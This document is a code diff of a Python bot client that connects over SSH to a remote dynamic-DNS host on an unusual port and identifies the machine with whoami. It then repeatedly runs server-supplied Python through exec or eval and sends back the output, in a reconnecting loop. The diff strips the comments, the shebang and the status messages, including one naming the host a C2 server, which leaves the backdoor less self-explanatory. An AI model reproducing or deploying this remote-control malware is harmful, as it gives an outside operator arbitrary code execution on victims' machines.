@@ -1,8 +1,8 @@
-#!/bin/env python3
 
-# This is a basic client for executing a command
 
-# Supress warnings
+
+
+
 import warnings
 warnings.filterwarnings("ignore")
 
@@ -18,7 +18,7 @@ import subprocess
 
 parent_dir = os.path.dirname(os.path.abspath(__file__))
 
-# Global variables to track SSH client and session
+
 ssh_client = None
 ssh_session = None
 process = None
@@ -26,42 +26,38 @@ process = None
 def exit_gracefully():
     global ssh_client, ssh_session, process
     
-    print("\n\n[!] Exiting gracefully...")
 
-    # Close SSH session and client if open
+    
     if ssh_session and ssh_session.active:
         ssh_session.close()
-        print("[!] SSH session closed.")
     
     if ssh_client:
         ssh_client.close()
-        print("[!] SSH client disconnected.")
     
-    # Terminate subprocess if it’s still running
+    
     if process and process.poll() is None:
         process.terminate()
         process.wait()
-        print("[!] Subprocess terminated.")
 
-    # Exit the program
+    
     sys.exit(0)
 
-# Signal handler function to catch Ctrl+C
+
 def signal_handler(sig, frame):
     exit_gracefully()
 
-# Register the signal handler for SIGINT (Ctrl+C)
+
 signal.signal(signal.SIGINT, signal_handler)
 
 
-# DNS resolution
+
 def dns_resolution(domain_name):
     try:
-        # Get the IP address of the given domain
+        
         ip_address = socket.gethostbyname(domain_name)
         return ip_address
     except socket.gaierror:
-        # Handle exception if domain resolution fails
+        
         return f"Error: Unable to resolve domain '{domain_name}'"
 
 
@@ -73,7 +69,7 @@ def exec_underlying_command(command):
 
     try:
         if os.name == 'nt':
-            # Ensure PowerShell runs the actual curl.exe instead of the alias
+            
             if command.startswith("curl "):
                 command = command.replace("curl ", "curl.exe ", 1)
 
@@ -85,7 +81,7 @@ def exec_underlying_command(command):
                 text=True
             )
         else:
-            # For Linux/macOS, execute normally
+            
             process = subprocess.Popen(
                 command, shell=True,
                 stdout=subprocess.PIPE,
@@ -109,7 +105,7 @@ command = "whoami".encode()
 user = exec_underlying_command(command)
 
 
-# Thread for counting 
+
 timeout = False
 def max_timeout(seconds=20):
     global timeout
@@ -122,92 +118,84 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
     ssh_client = paramiko.SSHClient()
 
     try:
-        # Load host keys if available, or use AutoAddPolicy to add new ones
+        
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-        # Load the private key from a file
+        
         private_key = paramiko.RSAKey.from_private_key_file(key_file)
         
-        # Connect to the SSH server using the private key
+        
         ssh_client.connect(ip, username=user, pkey=private_key, port=port)
 
-        # Open a session and execute the command
+        
         ssh_session = ssh_client.get_transport().open_session()
             
         server_instructions = None
 
-        #while server_instructions != "kill":
+        
         if ssh_session.active:
-            print("[!] Sending identity!")
             ssh_session.send(bot_user.encode())
 
-            # Start the timeout thread
+            
             timeout = False
             timeout_thread = threading.Thread(target=max_timeout, args=(300,))
             timeout_thread.daemon = True
             timeout_thread.start()
 
-            print("[!] Listening for instructions ...")
             while not timeout:
                 try:
                     ssh_session.settimeout(1.0)
                     server_instructions = ssh_session.recv(1024).decode().strip()
-                    #server_instructions = server_instructions.encode()
+                    
                     server_instructions = server_instructions
 
                     if server_instructions:
 
-                        # Handle termination command
+                        
                         if server_instructions == 'kill':
-                            print("[!] Session terminated by the server!")
                             exit_gracefully()
                         if server_instructions == 'exit':
-                            print("[*] Session finished by the server. Continuing to next loop.")
                             ssh_session.close()
                             ssh_client.close()
                             return
 
-                        # Execute command on the channel and capture output
-                        print("Trying to execute the command")
+                        
                         response = None
 
 
-                        # This requests a complete execution
+                        
                         if server_instructions.startswith('fe1482792327d18f5c73579b96d825266149d5e3c8522a6cddfbd90b0215f80e'):
                             server_instructions = server_instructions.removeprefix('fe1482792327d18f5c73579b96d825266149d5e3c8522a6cddfbd90b0215f80e')
-                            print(f"[!] Received instructions:\n{server_instructions}")
                             try:
                                 output = io.StringIO()
-                                sys.stdout = output  # Redirect stdout to capture print statements
+                                sys.stdout = output  
 
-                                exec_globals = globals().copy()  # Copy the actual global scope
-                                exec_locals = locals()  # Local scope
+                                exec_globals = globals().copy()  
+                                exec_locals = locals()  
 
-                                exec(server_instructions, exec_globals, exec_locals)  # Execute with access to existing functions
+                                exec(server_instructions, exec_globals, exec_locals)  
 
-                                response = exec_locals.get("response", "")  # Retrieve the response if set
+                                response = exec_locals.get("response", "")  
 
-                                sys.stdout = sys.__stdout__  # Restore stdout
-                                response = output.getvalue() if output.getvalue() else str(response)  # Capture print output
+                                sys.stdout = sys.__stdout__  
+                                response = output.getvalue() if output.getvalue() else str(response)  
                             except Exception as e:
                                 response = f"Command failed:\t{e}"
 
                         else:
-                            #server_instructions = server_instructions.removeprefix('eval')
+                            
                             try:
                                 output = io.StringIO()
-                                sys.stdout = output  # Redirect stdout to capture print statements
+                                sys.stdout = output  
                                 response = eval(server_instructions)
-                                sys.stdout = sys.__stdout__  # Restore stdout
-                                response = output.getvalue() if output.getvalue() else str(response)  # Capture print output
+                                sys.stdout = sys.__stdout__  
+                                response = output.getvalue() if output.getvalue() else str(response)  
                             except Exception as e:
                                 response = f"Command failed:\t{e}"
 
                         ssh_session.send(response.encode())
                         
-                        print("[!] Response sent!")
 
-                        #server_instructions = "kill"
                         ssh_session.close()
                         ssh_client.close()
                         return
@@ -220,14 +208,12 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
             ssh_client.close()
             response = f"Timeout while listening new instructions!"
             ssh_session.send(response.encode())
-            print("[!] Response sent!")
 
             return response
                 
         time.sleep(100)
 
     except Exception as e:
-        #print(f"[!] Error occurred: {e}")
         if ssh_session:
             ssh_session.close()
         if ssh_client:
@@ -240,14 +226,13 @@ if __name__ == "__main__":
     auth_path = os.path.join(parent_dir, 'mechanism')
     host = dns_resolution('ximand.ddns.net')
 
-    # Try forever the commands
+    
     while True:
         try:
             ssh_rev_shell(host, 'ubuntu', auth_path, user, 64000)
         except Exception as e:
             pass
-            #print(f"[!] Reconnection to C2 server failed!\n{e}\n")
 
-        # How frequent request a command
+        
         time.sleep(0.5)
 
